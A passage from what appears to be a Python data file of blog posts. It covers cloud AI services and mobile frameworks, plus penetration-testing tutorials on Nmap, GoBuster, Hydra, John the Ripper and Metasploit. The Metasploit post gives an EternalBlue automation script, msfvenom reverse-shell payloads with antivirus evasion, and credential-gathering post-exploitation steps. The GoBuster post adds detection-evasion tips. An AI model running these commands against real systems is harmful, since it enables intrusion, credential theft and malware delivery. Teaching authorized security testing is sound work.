        <p>Choosing the right cloud provider for AI workloads depends on specific requirements, existing infrastructure, and budget. Here's our detailed comparison based on real-world implementations.</p>

        <h4>Machine Learning Platforms:</h4>
        <table class="table table-bordered">
            <thead>
                <tr>
                    <th>Service</th>
                    <th>Azure</th>
                    <th>AWS</th>
                    <th>Google Cloud</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><strong>ML Platform</strong></td>
                    <td>Azure Machine Learning</td>
                    <td>Amazon SageMaker</td>
                    <td>Vertex AI</td>
                </tr>
                <tr>
                    <td><strong>AutoML</strong></td>
                    <td>Azure Automated ML</td>
                    <td>SageMaker Autopilot</td>
                    <td>Vertex AI AutoML</td>
                </tr>
                <tr>
                    <td><strong>Notebooks</strong></td>
                    <td>Azure ML Notebooks</td>
                    <td>SageMaker Notebooks</td>
                    <td>Vertex AI Workbench</td>
                </tr>
            </tbody>
        </table>

        <h4>AI Services Comparison:</h4>
        <ul>
            <li><strong>Computer Vision:</strong>
                <ul>
                    <li>Azure: Computer Vision, Custom Vision</li>
                    <li>AWS: Rekognition</li>
                    <li>Google: Vision AI</li>
                </ul>
            </li>
            <li><strong>Natural Language Processing:</strong>
                <ul>
                    <li>Azure: Text Analytics, Language Understanding</li>
                    <li>AWS: Comprehend, Lex</li>
                    <li>Google: Natural Language AI</li>
                </ul>
            </li>
            <li><strong>Generative AI:</strong>
                <ul>
                    <li>Azure: Azure OpenAI Service</li>
                    <li>AWS: Bedrock, SageMaker JumpStart</li>
                    <li>Google: PaLM API, Vertex AI Generative AI</li>
                </ul>
            </li>
        </ul>

        <h4>Pricing and Cost Considerations:</h4>
        <ul>
            <li><strong>Azure:</strong> Enterprise-friendly with Azure commitment discounts</li>
            <li><strong>AWS:</strong> Pay-as-you-go with savings plans</li>
            <li><strong>Google Cloud:</strong> Sustained use discounts and committed use contracts</li>
        </ul>

        <h4>Integration and Ecosystem:</h4>
        <ul>
            <li><strong>Azure:</strong> Excellent Microsoft ecosystem integration, strong enterprise features</li>
            <li><strong>AWS:</strong> Largest service catalog, mature DevOps tools</li>
            <li><strong>Google Cloud:</strong> Strong in data analytics and open-source integration</li>
        </ul>

        <h4>Our Recommendation Framework:</h4>
        <p>We recommend choosing based on:</p>
        <ul>
            <li><strong>Existing Investment:</strong> Stick with your current cloud provider if possible</li>
            <li><strong>Specific AI Needs:</strong> Choose based on required AI services</li>
            <li><strong>Team Skills:</strong> Consider your team's expertise</li>
            <li><strong>Budget:</strong> Compare total cost of ownership</li>
        </ul>

        <h4>Case Study: Multi-cloud AI Implementation</h4>
        <p>For a retail client, we implemented a multi-cloud AI strategy using Azure for computer vision (in-store analytics), AWS for recommendation engines, and Google Cloud for natural language processing (customer feedback analysis). This approach leveraged the strengths of each provider while maintaining cost efficiency.</p>
        ''',
        'date': 'August 5, 2025',
        'author': 'Thato Monyamane',
        'category': 'AI & Machine Learning',
        'read_time': '15 min read'
    },
    {
        'id': 16,
        'title': 'Advanced Network Reconnaissance with Nmap: Beyond Basic Scanning',
        'excerpt': 'Mastering Nmap for comprehensive network enumeration and vulnerability discovery.',
        'content': '''
        <p>As security researchers, network reconnaissance forms the foundation of any penetration test. Nmap remains the gold standard, but most practitioners barely scratch the surface of its capabilities.</p>

        <h4>Advanced Nmap Scanning Techniques:</h4>
        <pre><code>
# Stealth scanning with timing and decoys
nmap -sS -T2 -D 192.168.1.100,192.168.1.200,ME -f -g 53 target.com

# Comprehensive service detection
nmap -sV -sC -A -O -p- --script vuln target.com

# UDP service enumeration (often overlooked)
nmap -sU -sV --top-ports 1000 target.com

# Network topology discovery
nmap -sn --traceroute 192.168.1.0/24
        </code></pre>

        <h4>Nmap Scripting Engine (NSE) Power:</h4>
        <ul>
            <li><strong>Vulnerability Scanning:</strong> Use <code>--script vuln</code> for common CVEs</li>
            <li><strong>Brute Force Detection:</strong> <code>http-brute</code>, <code>ssh-brute</code> scripts</li>
            <li><strong>Service Enumeration:</strong> <code>http-enum</code> for web directory discovery</li>
            <li><strong>Security Audits:</strong> <code>ssl-enum-ciphers</code> for TLS configuration review</li>
        </ul>

        <h4>Real-World Case Study:</h4>
        <p>During a recent penetration test, we discovered a critical attack chain:</p>
        <ol>
            <li>Nmap scan revealed an outdated Apache Tomcat service (<code>-sV</code>)</li>
            <li><code>http-enum</code> script discovered /manager directory</li>
            <li>Default credentials found via <code>http-brute</code></li>
            <li>WAR file deployment leading to RCE</li>
        </ol>

        <h4>Output Analysis and Reporting:</h4>
        <pre><code>
# Generate comprehensive reports
nmap -sS -sV -sC -A -oA comprehensive_scan target.com

# Parse results with Nmap-formatted output
nmap -sS -oX scan_results.xml target.com
        </code></pre>

        <p>Always ensure you have proper authorization before conducting any security scans. These techniques should only be used in ethical security testing scenarios.</p>
        ''',
        'date': 'August 18, 2025',
        'author': 'Thato Monyamane',
        'category': 'Cybersecurity',
        'read_time': '12 min read'
    },
    {
        'id': 17,
        'title': 'Web Application Enumeration with GoBuster and SecLists',
        'excerpt': 'Advanced web directory and subdomain brute-forcing techniques for comprehensive reconnaissance.',
        'content': '''
        <p>Web application security testing begins with thorough enumeration. GoBuster combined with the SecLists wordlist collection provides a powerful toolkit for discovering hidden attack surfaces.</p>

        <h4>Comprehensive Directory Brute-Forcing:</h4>
        <pre><code>
# Basic directory discovery
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Advanced with extensions and status codes
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,js,txt -b 404,500

# With specific headers for authenticated scanning
gobuster dir -u https://target.com -w wordlist.txt -H "Authorization: Bearer token123"
        </code></pre>

        <h4>Subdomain Enumeration Strategies:</h4>
        <pre><code>
# Subdomain discovery
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# VHost enumeration
gobuster vhost -u https://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
        </code></pre>

        <h4>SecLists Wordlist Selection Guide:</h4>
        <ul>
            <li><strong>Quick Scans:</strong> <code>directory-list-2.3-small.txt</code> (87KB)</li>
            <li><strong>Comprehensive:</strong> <code>directory-list-2.3-medium.txt</code> (2.2MB)</li>
            <li><strong>API Endpoints:</strong> <code>Discovery/Web-Content/api/</code> wordlists</li>
            <li><strong>Backup Files:</strong> <code>Discovery/Web-Content/Backup/</code> wordlists</li>
            <li><strong>Parameter Discovery:</strong> <code>Discovery/Web-Content/burp-parameter-names.txt</code></li>
        </ul>

        <h4>Advanced Techniques:</h4>
        <pre><code>
# Recursive scanning for discovered directories
gobuster dir -u https://target.com/admin -w wordlist.txt -r

# Rate limiting to avoid detection
gobuster dir -u https://target.com -w wordlist.txt -t 50 -d

# Output results for further analysis
gobuster dir -u https://target.com -w wordlist.txt -o results.txt
        </code></pre>

        <h4>Real-World Discovery Chain:</h4>
        <p>During a bug bounty engagement, we found:</p>
        <ol>
            <li>Discovered <code>/backup</code> directory via GoBuster</li>
            <li>Found database backup files with plaintext credentials</li>
            <li>Used credentials to access admin panel</li>
            <li>Discovered SQL injection in admin search functionality</li>
        </ol>

        <h4>Defense Evasion Tips:</h4>
        <ul>
            <li>Use random User-Agent strings</li>
            <li>Implement delays between requests</li>
            <li>Rotate source IP addresses if possible</li>
            <li>Use residential proxies for stealth scanning</li>
        </ul>
        ''',
        'date': 'September 2, 2025',
        'author': 'Thato Monyamane',
        'category': 'Cybersecurity',
        'read_time': '10 min read'
    },
    {
        'id': 18,
        'title': 'Password Cracking Mastery: Hydra and John the Ripper',
        'excerpt': 'Advanced password attack techniques for various protocols and services.',
        'content': '''
        <p>Password attacks remain one of the most effective initial access vectors. Mastering Hydra for online attacks and John the Ripper for offline cracking is essential for any security researcher.</p>

        <h4>Hydra: Online Password Attacks</h4>
        <pre><code>
# SSH brute force with username list
hydra -L usernames.txt -P passwords.txt ssh://target.com

# HTTP POST form attacks
hydra -l admin -P passlist.txt target.com http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# FTP attacks with service detection
hydra -L users.txt -P passwords.txt ftp://target.com

# RDP attacks for Windows environments
hydra -t 1 -V -f -L users.txt -P passwords.txt rdp://192.168.1.100
        </code></pre>

        <h4>John the Ripper: Offline Password Cracking</h4>
        <pre><code>
# Basic password hash cracking
john --format=raw-md5 hashes.txt

# Wordlist mode with rules
john --wordlist=rockyou.txt --rules hashes.txt

# Incremental mode for comprehensive attacks
john --incremental=All hashes.txt

# Show cracked passwords
john --show hashes.txt
        </code></pre>

        <h4>Advanced Hashcat Integration:</h4>
        <pre><code>
# Convert hashes for Hashcat
john --format=raw-md5 hashes.txt --stdout | hashcat -m 0 -a 0 hashes.txt rockyou.txt

# GPU-accelerated cracking
hashcat -m 1000 -a 0 nt_hashes.txt rockyou.txt --force
        </code></pre>

        <h4>Protocol-Specific Attack Strategies:</h4>
        <ul>
            <li><strong>SSH:</strong> Use common default credentials and weak keys</li>
            <li><strong>HTTP Forms:</strong> Analyze login mechanisms for parameter names</li>
            <li><strong>Database Services:</strong> MySQL, PostgreSQL default credentials</li>
            <li><strong>Network Services:</strong> SNMP community strings, Telnet logins</li>
        </ul>

        <h4>Password Analysis and Wordlist Creation:</h4>
        <pre><code>
# Generate custom wordlists from target website
cewl https://target.com -m 6 -w custom_wordlist.txt

# Password policy analysis
crunch 8 12 -t @@@%%%^^ -o policy_wordlist.txt

# Combine and optimize wordlists
cat wordlist1.txt wordlist2.txt | sort -u > combined_wordlist.txt
        </code></pre>

        <h4>Real-World Case Study:</h4>
        <p>During a penetration test, we recovered password hashes from a compromised database:</p>
        <ol>
            <li>Used SQL injection to extract MD5 password hashes</li>
            <li>John cracked 40% of hashes in under 2 hours using wordlist+rules</li>
            <li>Discovered password reuse across multiple services</li>
            <li>Gained domain admin access through reused credentials</li>
        </ol>

        <h4>Defensive Countermeasures:</h4>
        <ul>
            <li>Implement account lockout policies</li>
            <li>Use multi-factor authentication</li>
            <li>Enforce strong password policies</li>
            <li>Monitor for brute force attempts</li>
        </ul>
        ''',
        'date': 'September 16, 2025',
        'author': 'Thato Monyamane',
        'category': 'Cybersecurity',
        'read_time': '14 min read'
    },
    {
        'id': 19,
        'title': 'Metasploit Framework: Advanced Exploitation Techniques',
        'excerpt': 'Mastering msfconsole and msfvenom for sophisticated attack chains and payload generation.',
        'content': '''
        <p>The Metasploit Framework remains the most comprehensive exploitation toolkit available. Advanced usage goes far beyond basic exploit execution.</p>

        <h4>Advanced Msfconsole Operations:</h4>
        <pre><code>
# Database integration for results tracking
msfdb init
msfconsole -q

# Advanced module searching
search type:exploit platform:windows target:2008

# Resource scripts for automation
cat > automation.rc << EOF
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.0/24
set THREADS 10
run
EOF
msfconsole -r automation.rc
        </code></pre>

        <h4>Msfvenom Payload Generation Mastery:</h4>
        <pre><code>
# Windows reverse shell with evasion
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 3 -o payload.exe

# Linux payloads
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f elf > shell.elf

# Web payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php

# Android applications
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o malicious.apk

# Custom encoding and format
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=443 -f c -e x86/alpha_mixed
        </code></pre>

        <h4>Post-Exploitation Automation:</h4>
        <pre><code>
# Meterpreter resource scripts
cat > post_exploit.rc << EOF
run post/windows/gather/credentials
run post/multi/manage/screenshot
run post/windows/gather/enum_logged_on_users
run post/windows/manage/migrate
EOF

# Load in meterpreter session
meterpreter > resource post_exploit.rc
        </code></pre>

        <h4>Advanced Exploitation Chains:</h4>
        <ul>
            <li><strong>Web Application → System Compromise:</strong>
                <ol>
                    <li>Upload web shell via file upload vulnerability</li>
                    <li>Use web_delivery module for staged payload</li>
                    <li>Establish Meterpreter session</li>
                    <li>Privilege escalation via local exploits</li>
                </ol>
            </li>
            <li><strong>Network Service → Lateral Movement:</strong>
                <ol>
                    <li>Exploit vulnerable network service</li>
                    <li>Dump credentials with hashdump</li>
                    <li>Pass-the-hash to other systems</li>
                    <li>Pivot through compromised hosts</li>
                </ol>
            </li>
        </ul>

        <h4>Evasion and Anti-Virus Bypass:</h4>
        <pre><code>
# Custom payload encoding
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -e x86/shikata_ga_nai -i 5 -x legit.exe -k -o malicious.exe

# Template injection for document attacks
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f vba-exe
        </code></pre>

        <h4>Real-World Red Team Operation:</h4>
        <p>During a recent engagement, we successfully compromised a corporate network:</p>
        <ol>
            <li>Phishing email with weaponized document (msfvenom)</li>
            <li>Initial foothold with Meterpreter session</li>
            <li>Lateral movement using psexec and stolen credentials</li>
            <li>Domain privilege escalation via token impersonation</li>
            <li>Data exfiltration through encrypted channels</li>
        </ol>

        <h4>Defensive Recommendations:</h4>
        <ul>
            <li>Implement application whitelisting</li>
            <li>Use endpoint detection and response (EDR) solutions</li>
            <li>Monitor for Meterpreter signatures and behaviors</li>
            <li>Regularly patch vulnerable software</li>
        </ul>
        ''',
        'date': 'September 30, 2024',
        'author': 'Thato Monyamane',
        'category': 'Cybersecurity',
        'read_time': '16 min read'
    },
    {
        'id': 20,
        'title': 'Building a Comprehensive Penetration Testing Toolkit',
        'excerpt': 'Essential tools and methodologies for effective security assessments and red team operations.',
        'content': '''
        <p>A security researcher's toolkit must be comprehensive, updated, and well-organized. Here's our curated collection of essential tools and methodologies.</p>

        <h4>Essential Tool Categories:</h4>
        <ul>
            <li><strong>Reconnaissance:</strong> Nmap, Recon-ng, theHarvester, Amass</li>
            <li><strong>Vulnerability Scanning:</strong> Nessus, OpenVAS, Nikto</li>
            <li><strong>Web Application Testing:</strong> Burp Suite, OWASP ZAP, SQLmap</li>
            <li><strong>Exploitation:</strong> Metasploit, Searchsploit, ExploitDB</li>
            <li><strong>Password Attacks:</strong> Hydra, John, Hashcat</li>
            <li><strong>Post-Exploitation:</strong> Mimikatz, PowerSploit, BloodHound</li>
            <li><strong>Network Analysis:</strong> Wireshark, Tcpdump, Responder</li>
        </ul>

        <h4>Custom Tool Development:</h4>
        <pre><code>
#!/bin/bash
# Automated reconnaissance script
echo "Starting comprehensive reconnaissance..."

# Subdomain enumeration
amass enum -d $1 -o amass_$1.txt
subfinder -d $1 -o subfinder_$1.txt

# Service discovery
nmap -sS -sV -sC -A -iL amass_$1.txt -oA nmap_scan_$1

# Web screenshotting
cat amass_$1.txt | aquatone -out aquatone_$1

echo "Reconnaissance complete for $1"
        </code></pre>

        <h4>Methodology Framework:</h4>
        <ol>
            <li><strong>Planning and Reconnaissance:</strong>
                <ul>
                    <li>Scope definition and rules of engagement</li>
                    <li>Passive information gathering</li>
                    <li>Active scanning and enumeration</li>
                </ul>
            </li>
            <li><strong>Vulnerability Analysis:</strong>
                <ul>
                    <li>Automated vulnerability scanning</li>
                    <li>Manual verification of findings</li>
                    <li>Risk assessment and prioritization</li>
                </ul>
            </li>
            <li><strong>Exploitation:</strong>
                <ul>
                    <li>Initial access attempts</li>
                    <li>Privilege escalation</li>
                    <li>Lateral movement</li>
                </ul>
            </li>
            <li><strong>Post-Exploitation:</strong>
                <ul>
                    <li>Data collection and analysis</li>
                    <li>Persistence establishment</li>
                    <li>Covering tracks</li>
                </ul>
            </li>
            <li><strong>Reporting:</strong>
                <ul>
                    <li>Executive summary</li>
                    <li>Technical details</li>
                    <li>Remediation recommendations</li>
                </ul>
            </li>
        </ol>

        <h4>Advanced Tool Configurations:</h4>
        <pre><code>
# Burp Suite configuration for advanced testing
# - Install critical extensions: Logger++, Autorize, Turbo Intruder
# - Configure project-specific settings
# - Set up macro-based authentication
# - Customize scan configurations

# Metasploit database setup
msfdb init
workspace -a Client_Engagement
db_import nmap_scan.xml
        </code></pre>

        <h4>Cloud Security Assessment Tools:</h4>
        <ul>
            <li><strong>AWS:</strong> Pacu, CloudMapper, Scout Suite</li>
            <li><strong>Azure:</strong> MicroBurst, Stormspotter</li>
            <li><strong>Google Cloud:</strong> GCPBucketBrute, G-Scout</li>
        </ul>

        <h4>Mobile Application Testing:</h4>
        <ul>
            <li><strong>Android:</strong> MobSF, Frida, Objection</li>
            <li><strong>iOS:</strong> iRET, Passionfruit, Cycript</li>
        </ul>

        <h4>Continuous Learning Resources:</h4>
        <ul>
            <li>Hack The Box and TryHackMe platforms</li>
            <li>OSCP, OSCE certification preparation</li>
            <li>Security conferences (DEF CON, Black Hat)</li>
            <li>Research papers and CVE monitoring</li>
        </ul>

        <h4>Legal and Ethical Considerations:</h4>
        <p>Always ensure proper authorization, maintain confidentiality of findings, and follow responsible disclosure practices. Document all activities for evidence and reporting purposes.</p>

        <p><strong>Remember:</strong> With great power comes great responsibility. Use these tools only in ethical security testing scenarios with proper authorization.</p>
        ''',
        'date': 'October 14, 2025',
        'author': 'Thato Monyamane',
        'category': 'Cybersecurity',
        'read_time': '18 min read'
    },
    {
        'id': 21,
        'title': 'Cross-Platform Mobile Development: React Native vs Kotlin Multiplatform vs QML',
        'excerpt': 'Comprehensive comparison of modern cross-platform frameworks for iOS and Android development.',
        'content': '''
        <p>Choosing the right cross-platform framework is crucial for mobile app success. As a mobile development specialist at Monyamane Tech Solutions, I've built production apps with all three technologies. Here's my detailed analysis.</p>

        <h4>Architecture Overview:</h4>
        <table class="table table-bordered">
            <thead>
                <tr>
                    <th>Framework</th>
                    <th>Architecture</th>
                    <th>Language</th>
                    <th>UI Approach</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><strong>React Native</strong></td>
                    <td>Bridge-based JavaScript runtime</td>
                    <td>JavaScript/TypeScript</td>
                    <td>Native components via JS bridge</td>
                </tr>
                <tr>
                    <td><strong>Kotlin Multiplatform</strong></td>
                    <td>Shared business logic, native UI</td>
                    <td>Kotlin</td>
                    <td>Platform-specific native UI</td>
                </tr>
                <tr>
                    <td><strong>QML</strong></td>
                    <td>Qt framework with declarative UI</td>
                    <td>QML/JavaScript/C++</td>
                    <td>Custom rendered UI components</td>
                </tr>
            </tbody>
        </table>

        <h4>Performance Comparison:</h4>
        <ul>
            <li><strong>React Native:</strong>
                <ul>
                    <li>JavaScript bridge overhead (10-15ms per call)</li>
                    <li>60 FPS achievable with optimization</li>
                    <li>Heavy computation requires native modules</li>
                </ul>
            </li>
            <li><strong>Kotlin Multiplatform:</strong>
                <ul>
                    <li>Near-native performance for business logic</li>
                    <li>UI performance identical to native apps</li>
                    <li>No bridge overhead for shared code</li>
                </ul>
            </li>
            <li><strong>QML:</strong>
                <ul>
                    <li>Excellent performance for graphics-intensive apps</li>
                    <li>Hardware-accelerated rendering</li>
                    <li>Minimal overhead for UI updates</li>
                </ul>
            </li>
        </ul>

        <h4>Development Experience:</h4>
        <pre><code>
// React Native Component
import React from 'react';
import {View, Text, StyleSheet} from 'react-native';

const MyComponent = ({title}) => (
  <View style={styles.container}>
    <Text style={styles.title}>{title}</Text>
  </View>
);

// Kotlin Multiplatform Shared Code
expect class Platform() {
    expect val platform: String
}

// QML Component
import QtQuick 2.15

Rectangle {
    width: 200; height: 100
    color: "lightblue"
    
    Text {
        text: "Hello QML"
        anchors.centerIn: parent
    }
}
        </code></pre>

        <h4>Ecosystem and Community:</h4>
        <ul>
            <li><strong>React Native:</strong> Massive community, extensive npm ecosystem</li>
            <li><strong>Kotlin Multiplatform:</strong> Growing ecosystem, strong JetBrains support</li>
            <li><strong>QML:</strong> Mature Qt ecosystem, strong in embedded and automotive</li>
        </ul>

        <h4>Our Recommendation Matrix:</h4>
        <ul>
            <li><strong>Choose React Native for:</strong> Rapid prototyping, web developer teams, rich npm ecosystem needs</li>
            <li><strong>Choose Kotlin Multiplatform for:</strong> Native performance requirements, existing Kotlin codebases, platform-specific UI needs</li>
            <li><strong>Choose QML for:</strong> Embedded systems, automotive, medical devices, custom UI requirements</li>
        </ul>
        ''',
        'date': 'October 28, 2025',
        'author': 'Thato Monyamane',
        'category': 'Mobile Development',
        'read_time': '12 min read'
    },
    {
        'id': 22,
        'title': 'React Native Deep Dive: Building Enterprise-Grade Applications',
        'excerpt': 'Advanced React Native patterns and best practices for production applications.',
        'content': '''
        <p>React Native has evolved significantly since its inception. At Monyamane Tech Solutions, we've built numerous enterprise applications using React Native. Here are our hard-earned lessons.</p>

        <h4>Advanced Architecture Patterns:</h4>
        <pre><code>
// Advanced React Native with TypeScript and State Management
import React from 'react';
import {Provider} from 'react-redux';
import {PersistGate} from 'redux-persist/integration/react';
import {store, persistor} from './store';
import AppNavigator from './navigation/AppNavigator';

const EnterpriseApp = () => (
  <Provider store={store}>
    <PersistGate loading={null} persistor={persistor}>
      <AppNavigator />
    </PersistGate>
  </Provider>
);

// Custom Native Module Integration
import {NativeModules} from 'react-native';
const {CustomNativeModule} = NativeModules;

export const performNativeOperation = async (data: string): Promise<string> => {
  return await CustomNativeModule.performOperation(data);
};
        </code></pre>

        <h4>Performance Optimization Strategies:</h4>
        <ul>
            <li><strong>Bundle Optimization:</strong>
                <pre><code>
// metro.config.js
module.exports = {
  transformer: {
    getTransformOptions: async () => ({
      transform: {
        experimentalImportSupport: false,
        inlineRequires: true,
      },
    }),
  },
};
                </code></pre>
            </li>
            <li><strong>Memory Management:</strong>
                <ul>
                    <li>Use <code>React.memo()</code> for expensive components</li>
                    <li>Implement virtualized lists for large datasets</li>
                    <li>Optimize image loading with caching</li>
                </ul>
            </li>
            <li><strong>Bridge Optimization:</strong>
                <ul>
                    <li>Batch bridge calls where possible</li>
                    <li>Use native modules for heavy computations</li>
                    <li>Implement lazy loading for components</li>
                </ul>
            </li>
        </ul>

        <h4>Testing Strategy:</h4>
        <pre><code>
// Jest Unit Tests
import React from 'react';
import {render, fireEvent} from '@testing-library/react-native';
import {LoginScreen} from './LoginScreen';

test('should login with valid credentials', () => {
  const mockOnLogin = jest.fn();
  const {getByPlaceholderText, getByText} = render(
    <LoginScreen onLogin={mockOnLogin} />
  );
  
  fireEvent.changeText(getByPlaceholderText('Email'), 'test@example.com');
  fireEvent.changeText(getByPlaceholderText('Password'), 'password123');
  fireEvent.press(getByText('Login'));
  
  expect(mockOnLogin).toHaveBeenCalledWith('test@example.com');
});

// Detox E2E Tests
describe('Login Flow', () => {
  it('should login successfully', async () => {
    await device.reloadReactNative();
    await element(by.id('email-input')).typeText('test@example.com');
    await element(by.id('password-input')).typeText('password123');
    await element(by.id('login-button')).tap();
    await expect(element(by.id('welcome-screen'))).toBeVisible();
  });
});
        </code></pre>

        <h4>Case Study: E-commerce Mobile App</h4>
        <p>We built a React Native e-commerce app serving 50,000+ users:</p>
        <ul>
            <li>Initial load time: 2.1 seconds (optimized from 4.5 seconds)</li>
            <li>Code sharing: 95% between iOS and Android</li>
            <li>Team: 4 React Native developers, 2 native developers</li>
            <li>Key libraries: Redux Toolkit, React Navigation, FastImage</li>
        </ul>

        <h4>Advanced Tooling Setup:</h4>
        <ul>
            <li><strong>CI/CD:</strong> GitHub Actions with Fastlane</li>
            <li><strong>Monitoring:</strong> Sentry for error tracking</li>
            <li><strong>Analytics:</strong> Firebase Analytics and Crashlytics</li>
            <li><strong>State Management:</strong> Redux Toolkit with RTK Query</li>
        </ul>

        <h4>When to Choose React Native:</h4>
        <ul>
            <li>Rapid development and iteration needs</li>
            <li>Existing web development expertise</li>
            <li>Rich ecosystem requirements</li>
            <li>Strong community support needs</li>
        </ul>
        ''',
        'date': 'November 11, 2025',
        'author': 'Thato Monyamane',
        'category': 'Mobile Development',
        'read_time': '14 min read'
    },
    {
        'id': 23,
        'title': 'Kotlin Multiplatform: Shared Logic with Native UI Excellence',
        'excerpt': 'Leveraging Kotlin Multiplatform for maximum code sharing while maintaining native performance.',
        'content': '''
        <p>Kotlin Multiplatform (KMP) represents a paradigm shift in cross-platform development. Unlike other approaches, KMP focuses on sharing business logic while using platform-specific UI layers.</p>

        <h4>Advanced KMP Architecture:</h4>
        <pre><code>
// Shared common module
class DataRepository(private val api: ApiService) {
    suspend fun getUserData(userId: String): User = 
        api.getUser(userId)
    
    suspend fun updateUser(user: User): Boolean =
        api.updateUser(user)
}

// Android-specific implementation
actual class Platform actual constructor() {
    actual val platform: String = "Android ${android.os.Build.VERSION.SDK_INT}"
}

// iOS-specific implementation
actual class Platform actual constructor() {
    actual val platform: String = 
        UIDevice.currentDevice.systemName + " " + UIDevice.currentDevice.systemVersion
}

// Expect/Actual for platform-specific APIs
expect class FileManager {
    fun readFile(path: String): String
    fun writeFile(path: String, content: String)
}
        </code></pre>

        <h4>UI Layer Implementation:</h4>
        <pre><code>
// Android UI (Jetpack Compose)
@Composable
fun UserProfileScreen(viewModel: UserProfileViewModel) {
    val userState by viewModel.userState.collectAsState()
    
    Column {
        Text(text = userState.user?.name ?: "Loading...")
        Button(onClick = { viewModel.refreshUser() }) {
            Text("Refresh")
        }
    }
}

// iOS UI (SwiftUI)
struct UserProfileView: View {
    @ObservedObject var viewModel: UserProfileViewModel
    
    var body: some View {
        VStack {
            Text(viewModel.userState.user?.name ?? "Loading...")
            Button("Refresh") {
                viewModel.refreshUser()
            }
        }
    }
}
        </code></pre>

        <h4>Advanced KMP Features:</h4>
        <ul>
            <li><strong>Coroutines Support:</strong> Full async/await across platforms</li>
            <li><strong>Serialization:</strong> Kotlinx.serialization for JSON handling</li>
            <li><strong>Dependency Injection:</strong> Koin or Kodein for shared DI</li>
            <li><strong>Database Sharing:</strong> SQLDelight for cross-platform database</li>
        </ul>

        <h4>Performance Benchmarks:</h4>
        <table class="table table-bordered">
            <thead>
                <tr>
                    <th>Operation</th>
                    <th>KMP</th>
                    <th>React Native</th>
                    <th>Native</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>JSON Parsing (10k objects)</td>
                    <td>120ms</td>
                    <td>450ms</td>
                    <td>110ms</td>
                </tr>
                <tr>
                    <td>Database Query</td>
                    <td>15ms</td>
                    <td>85ms</td>
                    <td>14ms</td>
                </tr>
                <tr>
                    <td>UI Rendering</td>
                    <td>Native</td>
                    <td>Bridge</td>
                    <td>Native</td>
                </tr>
            </tbody>
        </table>

        <h4>Case Study: Financial Trading App</h4>
        <p>We built a high-frequency trading application using KMP:</p>
        <ul>
            <li>Code sharing: 87% business logic, 0% UI</li>
            <li>Performance: Identical to native for critical operations</li>
            <li>Team structure: 2 Kotlin developers, 1 Android, 1 iOS</li>
            <li>Key benefits: Real-time data processing, low latency</li>
        </ul>

        <h4>Integration with Existing Codebases:</h4>
        <pre><code>
// Gradual adoption strategy
// 1. Start with shared utility functions
// 2. Move to data models and business logic
// 3. Implement platform-specific UI layers
// 4. Replace platform-specific networking

// Build configuration for mixed projects
plugins {
    kotlin("multiplatform")
    id("com.android.library")
}

kotlin {
    android()
    ios()
    
    sourceSets {
        val commonMain by getting {
            dependencies {
                implementation("org.jetbrains.kotlinx:kotlinx-coroutines-core:1.6.4")
            }
        }
    }
}
        </code></pre>

        <h4>When to Choose Kotlin Multiplatform:</h4>
        <ul>
            <li>Performance-critical applications</li>
            <li>Existing Kotlin/Java codebases</li>
            <li>Need for platform-specific UI/UX</li>
            <li>Enterprise applications with long-term maintenance</li>
        </ul>
        ''',
        'date': 'November 25, 2025',
        'author': 'Thato Monyamane',
        'category': 'Mobile Development',
        'read_time': '15 min read'
    },
    {
        'id': 24,
        'title': 'QML and Qt Framework: Beyond Mobile to Cross-Platform Excellence',
        'excerpt': 'Mastering QML for sophisticated cross-platform applications beyond traditional mobile use cases.',
        'content': '''
        <p>QML (Qt Modeling Language) represents a powerful approach to cross-platform development, particularly strong in embedded systems, automotive, and desktop applications.</p>

        <h4>QML Architecture and Strengths:</h4>
        <pre><code>
// Advanced QML Component with JavaScript integration
import QtQuick 2.15
import QtQuick.Controls 2.15
import QtCharts 2.3

ApplicationWindow {
    width: 1024; height: 768
    visible: true
    
    ChartView {
        title: "Real-time Data Visualization"
        anchors.fill: parent
        theme: ChartView.ChartThemeDark
        
        LineSeries {
            name: "Sensor Data"
            axisX: ValueAxis { min: 0; max: 100 }
            axisY: ValueAxis { min: -1; max: 1 }
            
            // Dynamic data updates
            function updateData(newValues) {
                clear()
                for (var i = 0; i < newValues.length; i++) {
                    append(i, newValues[i])
                }
            }
        }
    }
    
    // C++ integration
    Connections {
        target: dataProvider
        onNewDataAvailable: {
            chartView.series(0).updateData(newData)
        }
    }
}
        </code></pre>

        <h4>C++ Integration Power:</h4>
        <pre><code>
// Advanced C++/QML integration
class DataProcessor : public QObject {
    Q_OBJECT
    Q_PROPERTY(QVariantList processedData READ processedData NOTIFY dataChanged)
    
public:
    explicit DataProcessor(QObject *parent = nullptr);
    
    Q_INVOKABLE void processData(const QVariantList &rawData);
    Q_INVOKABLE QVariantList filterData(const QString &filter);
    
signals:
    void dataChanged();
    
private:
    QVariantList m_processedData;
};

// QML usage
DataProcessor {
    id: processor
    onDataChanged: {
        chart.updateData(processor.processedData)
    }
}
        </code></pre>

        <h4>Performance Characteristics:</h4>
        <ul>
            <li><strong>Graphics Performance:</strong> Excellent for 2D/3D rendering</li>
            <li><strong>Memory Usage:</strong> Higher than native but optimized</li>
            <li><strong>Startup Time:</strong> Faster than React Native, slower than native</li>
            <li><strong>Binary Size:</strong> Larger due to Qt framework inclusion</li>
        </ul>

        <h4>Use Case Specializations:</h4>
        <ul>
            <li><strong>Automotive:</strong> Instrument clusters, infotainment systems</li>
